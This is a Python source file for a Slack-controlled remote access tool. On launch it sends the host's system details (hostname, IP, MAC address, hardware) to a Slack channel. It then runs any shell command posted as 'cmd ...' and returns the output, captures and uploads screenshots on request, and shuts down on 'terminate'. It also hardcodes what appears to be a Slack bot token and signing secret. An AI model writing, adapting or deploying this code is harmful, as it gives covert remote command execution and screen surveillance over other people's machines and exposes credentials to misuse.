import slack
import os
import sys
import subprocess
import uuid
import time
import pyautogui
import requests
import tempfile
import platform
import socket
import re
import json
import psutil
from pathlib import Path
from dotenv import load_dotenv
from flask import Flask
from slackeventsapi import SlackEventAdapter
from requests.exceptions import HTTPError

env_path= Path('.')/ '.env'
SIGNING_SECRET="d5e19bc42b528bd1aee28b29b53a0484"
SLACK_TOKEN1="xoxb-2343443124982-2489932792052-pE6QzpiDcmbqPTn8vlrsPpZK"
app= Flask(__name__)
slack_event_adapter= SlackEventAdapter(SIGNING_SECRET,'/slack/events',app)

client = slack.WebClient(token=SLACK_TOKEN1)

BOT_ID = client.api_call("auth.test")['user_id']
user = "U02AABDC1SP"
channel = "C02E7M8AGKC"

def post_chat_message(data_in):
    try:
        # print(data_in)
        paramz = {'channel': channel}
        headerz = {'Authorization': 'Bearer ' + SLACK_TOKEN1,
                   'Content-Type': 'application/json'}
        res = requests.post(
            'https://slack.com/api/chat.postMessage', params=paramz, headers=headerz, data=data_in)
        output = res.json()
        # print(output)
        return output

    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')

def getSystemInfo():
    try:
        info = {}
        info['platform'] = platform.system()
        info['platform_release'] = platform.release()
        info['platform_version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        info['ip_address'] = socket.gethostbyname(socket.gethostname())
        info['mac_address'] = ':'.join(re.findall('..',
                                       '%012x' % uuid.getnode()))
        info['processor'] = platform.processor()
        info['ram'] = str(
            round(psutil.virtual_memory().total / (1024.0 ** 3)))+" GB"
        return json.dumps(info, indent=2)
    except Exception as e:
        print(e)

def ping():
    sys_info = getSystemInfo()
    msg_output = post_chat_message(json.dumps(
        {'channel': channel,  'text': f'Pinging from \n ```\n{sys_info}\n```'}))
    new_latest_ts = msg_output.get('ts')
    # print("Latest Ts " + new_latest_ts)
    # print(msg_output)
    if new_latest_ts:
        global from_ts
        from_ts = new_latest_ts


ping()

@slack_event_adapter.on('message')
def message(payload):
    event=payload.get('event',{})
    channel_id=event.get('channel')
    user_id=event.get('user')
    text=event.get('text')
    print(payload)
    if BOT_ID != user_id:
     if(text.startswith('cmd ')):
           text = text.replace('cmd ', '', 1)
           print("$> " + text)
           client.chat_postMessage(channel=channel_id, text=os.popen(text).read())
     elif text == "screengrab":
           temp = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
           print(temp.name)
           ss = pyautogui.screenshot(temp.name)
           client.files_upload(channels=channel_id, file=temp.name)
           temp.close()
           os.unlink(temp.name)
     elif text == "terminate":
                os._exit(0)
    
           
if __name__ == "__main__":
    app.run(debug=True)